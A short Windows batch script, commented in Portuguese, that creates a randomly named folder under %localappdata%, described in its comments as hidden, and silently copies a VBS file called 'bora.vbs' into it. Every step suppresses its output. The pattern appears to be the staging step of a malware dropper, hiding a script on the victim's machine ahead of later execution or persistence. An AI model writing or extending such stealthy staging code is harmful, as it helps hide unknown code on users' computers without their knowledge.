@echo off
:: Gera nome aleatório para pasta oculta
set "randomname=temp_%random%%random%"
:: Cria pasta oculta no %localappdata%
mkdir "%localappdata%\%randomname%" >nul 2>&1
:: Copia o script VBS para a pasta
copy "bora.vbs" "%localappdata%\%randomname%\" >nul 2>&1
